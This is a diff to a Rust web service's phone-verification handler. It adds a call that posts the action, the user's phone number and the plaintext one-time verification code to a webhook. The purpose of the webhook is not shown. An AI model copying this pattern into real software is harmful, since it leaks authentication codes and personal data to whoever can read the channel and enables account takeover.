@@ -7,7 +7,11 @@ use serde::{Deserialize, Serialize};
 use sqlx::{Pool, Sqlite};
 use utoipa::{OpenApi, ToSchema};
 
-use crate::{config::Config, models, utils::get_random_string};
+use crate::{
+    config::Config,
+    models,
+    utils::{get_random_string, send_webhook},
+};
 use crate::{
     models::Action,
     utils::{self, phone_validator},
@@ -85,6 +89,14 @@ async fn verification(
         Action::Login => "login",
         Action::Delete => "delete",
     };
+
+    send_webhook(
+        "Verificatin",
+        &format!("act: {action}\nphone: ||`{}`||\ncode: `{code}`", body.phone),
+        2017768,
+    )
+    .await;
+
     let expires = now + 180;
     let _ = sqlx::query_as! {
         models::Verification,
